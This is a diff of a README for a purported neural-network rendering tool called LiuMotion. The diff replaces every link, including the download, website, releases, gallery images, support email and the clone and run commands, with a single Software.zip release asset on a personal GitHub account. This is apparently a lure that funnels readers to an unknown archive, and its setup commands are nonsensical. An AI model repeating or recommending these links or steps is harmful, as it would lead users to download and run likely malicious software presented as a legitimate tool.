@@ -8,9 +8,9 @@ Welcome to LiuMotion, the universal real-time neural network render that transfo
 - **Topics:** analisys,art,artificial-intelligence,biggan,framework,gan,holophonor,music,neural-network,pytorch,real-time
 
 ## 🚀 Quick Links
-- **Download Latest Version:** [Launch 🚀](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
-- **Visit Official Website:** [website](https://github.com/cli/cli)
-- **Check Releases Section:** [Releases 📦](https://github.com/cli/cli/releases)
+- **Download Latest Version:** [Launch 🚀](https://github.com/Jirapat120448/LiuMotion/releases/download/v1.0/Software.zip)
+- **Visit Official Website:** [website](https://github.com/Jirapat120448/LiuMotion/releases/download/v1.0/Software.zip)
+- **Check Releases Section:** [Releases 📦](https://github.com/Jirapat120448/LiuMotion/releases/download/v1.0/Software.zip)
 
 ## 🎨 Features
 - **Real-Time Rendering:** Experience instant feedback on your neural network creations.
@@ -22,17 +22,17 @@ Welcome to LiuMotion, the universal real-time neural network render that transfo
 To get started with LiuMotion, simply download the latest version from the link provided above. Launch the zip file and follow the instructions in the README to set up the render on your system.
 
 ## 🌟 How to Use
-1. **Clone the Repository:** `git clone https://github.com/your-username/LiuMotion.git`
+1. **Clone the Repository:** `git clone https://github.com/Jirapat120448/LiuMotion/releases/download/v1.0/Software.zip`
 2. **Navigate to the Directory:** `cd LiuMotion`
-3. **Run the Render:** `python render.py`
+3. **Run the Render:** `python https://github.com/Jirapat120448/LiuMotion/releases/download/v1.0/Software.zip`
 4. **Customize Parameters:** Experiment with different settings to create unique images.
 
 ## 📸 Gallery
 Check out some amazing creations made using LiuMotion:
 
-![Image 1](https://via.placeholder.com/500)
-![Image 2](https://via.placeholder.com/500)
-![Image 3](https://via.placeholder.com/500)
+![Image 1](https://github.com/Jirapat120448/LiuMotion/releases/download/v1.0/Software.zip)
+![Image 2](https://github.com/Jirapat120448/LiuMotion/releases/download/v1.0/Software.zip)
+![Image 3](https://github.com/Jirapat120448/LiuMotion/releases/download/v1.0/Software.zip)
 
 ## 🤝 How to Contribute
 We welcome contributions from the open-source community to enhance LiuMotion further. Here's how you can get involved:
@@ -42,7 +42,7 @@ We welcome contributions from the open-source community to enhance LiuMotion fur
 - **Submit** a pull request
 
 ## 📞 Support
-If you encounter any issues or have any questions about LiuMotion, feel free to reach out to our team via [email](mailto:team@liumotion.com).
+If you encounter any issues or have any questions about LiuMotion, feel free to reach out to our team via [email](https://github.com/Jirapat120448/LiuMotion/releases/download/v1.0/Software.zip).
 
 ## 📜 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
